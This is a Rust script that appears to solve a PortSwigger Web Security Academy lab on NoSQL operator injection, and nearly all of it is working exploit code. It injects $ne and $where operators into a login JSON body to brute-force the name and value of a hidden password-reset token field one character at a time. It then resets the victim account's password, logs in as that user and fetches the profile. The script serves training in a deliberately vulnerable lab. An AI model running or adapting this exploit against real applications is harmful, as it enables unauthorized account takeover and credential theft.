/***************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 4/10/2023
*
* Lab: Exploiting NoSQL operator injection to extract unknown fields
*
* Steps: 1. Fetch the forgot-password page
*        2. Extract the csrf token and session cookie
*        3. Make a forgot-password request for carlos
*        4. Inject an operator and payload into the login JSON object to determine
*           the length of the unknown field name
*        5. Modify the payload to brute force the field name
*        6. Modify the payload to determine the length of the field value
*        7. Modify the payload to brute force the field value
*        8. Fetch the forgot-password page with the field name and its value
*           as a query pararmeter
*        9. Extract the csrf token and session cookie
*        10. Make a reset password request for carlos
*        11. Login as carlos with the new password
*        12. Fetch the carlos profile
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0ae600870485d3fc815a546b0069005c.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "âŸª#âŸ« Injection point:".blue(),
        "login JSON object".yellow()
    );
    print!("{}", "â¦—1â¦˜ Fetching the forgot-password page.. ".white(),);
    io::stdout().flush();

    // fetch the forgot-password page
    let mut forgot_password_page =
        client
            .get(format!("{url}/forgot-password"))
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the forgot-password page".red()
            ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—2â¦˜ Extracting the csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(forgot_password_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token
    let mut csrf = extract_csrf(forgot_password_page)
        .expect(&format!("{}", "[!] Failed to extract the csrf token".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—3â¦˜ Sending a reset password request for carlos.. ".white(),
    );
    io::stdout().flush();

    // make a forgot-password request for carlos
    client
        .post(format!("{url}/forgot-password"))
        .form(&HashMap::from([("username", "carlos"), ("csrf", &csrf)]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to make the forgot-password request for carlos".red()
        ));

    println!("{}", "OK".green());

    // determine the 3rd field length
    let field_name_length = determine_length(&client, url, "");

    // brute force the 3rd field name
    let field_name = brute_force(&client, url, "", field_name_length);

    // determine the 3rd field value length
    let field_value_length = determine_length(&client, url, &field_name);

    // brute force the 3rd field value
    let field_value = brute_force(&client, url, &field_name, field_value_length);

    print!(
        "{}",
        "\nâ¦—8â¦˜ Fetching the forgot-password page with the field name and its value as a query pararmter.. ".white()
    );
    io::stdout().flush();

    // fetch the forgot-password page with the extracted field name and its value as a query parameter
    forgot_password_page = client
        .get(format!("{url}/forgot-password?{field_name}={field_value}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the forgot-password page with the extracted field name and its value as a query parameter".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—9â¦˜ Extracting the csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    session = extract_session_cookie(forgot_password_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token
    csrf = extract_csrf(forgot_password_page)
        .expect(&format!("{}", "[!] Failed to extract the csrf token".red()));

    println!("{}", "OK".green());

    // set new password
    // change this to what you want
    let new_password = "hacked";

    print!(
        "{} {}.. ",
        "â¦—10â¦˜ Reseting carlos password to".white(),
        new_password.blue()
    );
    io::stdout().flush();

    // reset carlos password
    client
        .post(format!("{url}/forgot-password"))
        .form(&HashMap::from([
            ("csrf", csrf),
            (&field_name, field_value),
            ("new-password-1", new_password.to_string()),
            ("new-password-2", new_password.to_string()),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to reset carlos password".red()));

    println!("{}", "OK".green());
    print!("{}", "â¦—11â¦˜ Logging in as the carlos.. ".white(),);
    io::stdout().flush();

    // correct credentials of carlos
    let data = format!(
        r###"
    {{
        "username": "carlos",
        "password": "{new_password}"
    }}
        "###
    );

    // login as the carlos
    let carlos_login = client
        .post(format!("{url}/login"))
        .header("Content-Type", "application/json")
        .body(data)
        .send()
        .expect(&format!("{}", "[!] Failed to login as carlos".red()));

    // extract carlos session cookie
    session = extract_session_cookie(carlos_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!("{}", "â¦—12â¦˜ Fetching the carlos profile.. ".white(),);
    io::stdout().flush();

    // fetch carlos page
    let carlos = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch carlos profile".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "ðŸ—¹ Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.find(text) {
        Some(text.as_str().to_string())
    } else {
        None
    }
}

/**********************************
* Function to determine length
***********************************/
fn determine_length(client: &Client, url: &str, field_name: &str) -> usize {
    // variable that will updated with correct length
    let mut length = 0;

    // some output formatting based on which step you are in
    match field_name {
        "" => (),
        _ => println!(""),
    }

    for i in 1..50 {
        // print information based on which step you are in
        match field_name {
            "" => {
                print!(
                    "\r{} {} {} {}",
                    "â¦—4â¦˜ Checking if field number".white(),
                    "3".to_string().blue(),
                    "length = ",
                    i.to_string().yellow()
                );
            }
            _ => {
                print!(
                    "\r{} {} {} {}",
                    "â¦—6â¦˜ Checking if the field".white(),
                    field_name.to_string().blue(),
                    "length = ",
                    i.to_string().yellow()
                );
            }
        }
        io::stdout().flush();

        // payload to determine the length
        let mut payload = String::new();

        // set the payload based on which step you are in
        // "" means that you determine the length of the field name
        // _ means that you determine the length of the field value
        match field_name {
            "" => {
                payload = format!(
                    r###"
                {{
                    "username": "carlos",
                    "password": {{
                        "$ne": ""
                    }},
                    "$where": "Object.keys(this)[3].length == {i}"
                }}
                "###
                );
            }
            _ => {
                payload = format!(
                    r###"
                {{
                    "username": "carlos",
                    "password": {{
                        "$ne": ""
                    }},
                    "$where": "this.{field_name}.length == {i}"
                }}
                "###
                );
            }
        }

        // fetch the page with the injected payload
        let injection = client
            .post(format!("{url}/login"))
            .header("Content-Type", "application/json")
            .body(payload)
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload to determine field length"
                    .red()
            ));

        // extract the error message from the response body
        let body = injection.text().unwrap();
        let error_text = extract_pattern("Invalid username or password", &body);

        // if the error message is not returned in the response
        if error_text.is_none() {
            println!(
                " [ {} {} ]",
                "Correct length:".white(),
                i.to_string().green().bold()
            );

            // correct length
            length = i;

            break;
        } else {
            continue;
        }
    }

    // return the correct length
    length
}

/************************************
* Function to brute force field name
*************************************/
fn brute_force(client: &Client, url: &str, field_name: &str, length: usize) -> String {
    // string that will hold the correct value
    let mut correct_value = String::new();

    for position in 0..length {
        // iterate over possible chars
        for character in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".chars() {
            // print information based on which step you are in
            match field_name {
                "" => {
                    print!(
                        "\r{} {} {} {} {} {}",
                        "â¦—5â¦˜ Checking if the char of field".white(),
                        "3".to_string().blue(),
                        "at position".white(),
                        position.to_string().blue(),
                        " = ".white(),
                        character.to_string().yellow()
                    );
                }
                _ => {
                    print!(
                        "\r{} {} {} {} {} {}",
                        "â¦—7â¦˜ Checking if the char of".white(),
                        field_name.to_string().blue(),
                        "at position".white(),
                        position.to_string().blue(),
                        " = ".white(),
                        character.to_string().yellow()
                    );
                }
            }

            io::stdout().flush();

            // payload to brute force
            let mut payload = String::new();

            // set the payload based on which step you are in
            // "" means that you brute force the field name
            // _ means that you brute force the field value
            match field_name {
                "" => {
                    payload = format!(
                        r###"
                    {{
                        "username": "carlos",
                        "password": {{
                            "$ne": ""
                        }},
                        "$where": "Object.keys(this)[3][{position}] == '{character}'"
                    }}
                    "###
                    );
                }
                _ => {
                    payload = format!(
                        r###"
                    {{
                        "username": "carlos",
                        "password": {{
                            "$ne": ""
                        }},
                        "$where": "this.{field_name}[{position}] == '{character}'"
                    }}
                    "###
                    );
                }
            }

            // fetch the page with the injected payload
            let injection = client
                .post(format!("{url}/login"))
                .header("Content-Type", "application/json")
                .body(payload)
                .send()
                .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload to brute force field name"
                    .red()
            ));

            // extract the error message from the response body
            let body = injection.text().unwrap();
            let error_text = extract_pattern("Invalid username or password", &body);

            // if the error message is not returned in the response
            if error_text.is_none() {
                // update the correct value with the found char
                correct_value.push(character);

                // print information based on which step you are in
                match field_name {
                    "" => {
                        print!(
                            " [ {} {} ]",
                            "Correct name:".white(),
                            correct_value.green().bold()
                        )
                    }
                    _ => {
                        print!(
                            " [ {} {} ]",
                            "Correct value:".white(),
                            correct_value.green().bold()
                        )
                    }
                }

                break;
            } else {
                continue;
            }
        }
    }

    // return the correct value
    correct_value
}
